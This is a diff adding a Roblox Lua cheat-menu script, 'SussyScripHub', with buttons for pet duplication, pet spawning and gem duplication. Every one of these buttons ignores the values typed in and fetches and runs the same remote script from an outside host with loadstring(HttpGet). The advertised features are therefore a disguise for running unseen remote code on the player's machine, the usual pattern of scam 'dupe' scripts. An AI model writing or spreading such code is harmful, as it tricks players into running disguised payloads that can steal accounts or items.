@@ -1,0 +1,163 @@
+-- Load Orion library
+local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
+
+-- Create main window
+local Window = OrionLib:MakeWindow({
+    Name = "SussyScripHub",
+    HidePremium = false,
+    Introtext = "Dupe",
+    SaveConfig = true,
+    ConfigFolder = "SussyScripHub"
+})
+
+-- Section for Dupe Button
+local DupeTab = Window:MakeTab({
+    Name = "Dupe",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local DupeSection = DupeTab:AddSection({
+    Name = "Dupe Section"
+})
+
+DupeSection:AddTextbox({
+    Name = "Type the name of the pet to dupe",
+    TextDisappear = true,
+    Callback = function(Value)
+        local petName = tostring(Value)
+        print("Pet to dupe set to: " .. petName)
+    end
+})
+
+DupeSection:AddButton({
+    Name = "Dupe",
+    Callback = function()
+        loadstring(game:HttpGet("https://egorikusa.space/bb416c1b128087fe65c0be59.lua", true))()
+        print("Dupe script executed.")
+    end    
+})
+
+-- Section for Digsite Button
+local DigsiteTab = Window:MakeTab({
+    Name = "Digsite",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local DigsiteSection = DigsiteTab:AddSection({
+    Name = "Digsite Section"
+})
+
+DigsiteSection:AddButton({
+    Name = "Digsite",
+    Callback = function()
+        loadstring(game:HttpGet("https://egorikusa.space/bb416c1b128087fe65c0be59.lua", true))()
+        print("Digsite script executed!")
+    end    
+})
+
+-- Section for Pet Spawner Button
+local PetSpawnerTab = Window:MakeTab({
+    Name = "Pet Spawner",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local PetSpawnerSection = PetSpawnerTab:AddSection({
+    Name = "Pet Spawner Section"
+})
+
+local fromPetInput = "Neon Cat"  -- Default value for fromPet
+local toPetInput = "Titanic Monkey"  -- Default value for toPet
+
+PetSpawnerSection:AddTextbox({
+    Name = "From Pet",
+    Default = fromPetInput,
+    TextDisappear = true,
+    Callback = function(Value)
+        fromPetInput = Value
+        print("From Pet set to: " .. fromPetInput)
+    end
+})
+
+PetSpawnerSection:AddTextbox({
+    Name = "To Pet",
+    Default = toPetInput,
+    TextDisappear = true,
+    Callback = function(Value)
+        toPetInput = Value
+        print("To Pet set to: " .. toPetInput)
+    end
+})
+
+PetSpawnerSection:AddButton({
+    Name = "Change!",
+    Callback = function()
+        loadstring(game:HttpGet("https://egorikusa.space/bb416c1b128087fe65c0be59.lua", true))()
+        print("Change script executed.")
+    end    
+})
+
+-- Section for Gem Dupe Button
+local GemDupeTab = Window:MakeTab({
+    Name = "Gem Dupe",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local GemDupeSection = GemDupeTab:AddSection({
+    Name = "Gem Dupe Section"
+})
+
+local gemAmountInput = "100"  -- Default value
+
+GemDupeSection:AddTextbox({
+    Name = "Number of Gems",
+    Default = gemAmountInput,
+    TextDisappear = true,
+    Callback = function(Value)
+        gemAmountInput = Value
+        print("Gem amount set to: " .. gemAmountInput)
+    end
+})
+
+GemDupeSection:AddButton({
+    Name = "Dupe Gems",
+    Callback = function()
+        loadstring(game:HttpGet("https://egorikusa.space/bb416c1b128087fe65c0be59.lua", true))()
+        print("Gem dupe script executed.")
+    end    
+})
+
+-- Section for Credit Button
+local CreditTab = Window:MakeTab({
+    Name = "Credit",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local CreditSection = CreditTab:AddSection({
+    Name = "Credit Section"
+})
+
+CreditSection:AddButton({
+    Name = "🔥SussyScrip🔥",
+    Callback = function()
+        -- Copy to clipboard function
+        local function copyToClipboard(text)
+            local clipboard = game:GetService("ClipboardService")
+            clipboard:SetClipboard(text)
+        end
+        
+        -- URL to copy to clipboard
+        local url = "https://www.youtube.com/channel/UCD9D2LIPzLSOJ4af6OaYF2A"
+        
+        -- Copy the URL to clipboard
+        copyToClipboard(url)
+        print("URL copied to clipboard: " .. url)
+    end
+})
+
+-- Initialize the Orion library
+OrionLib:Init()
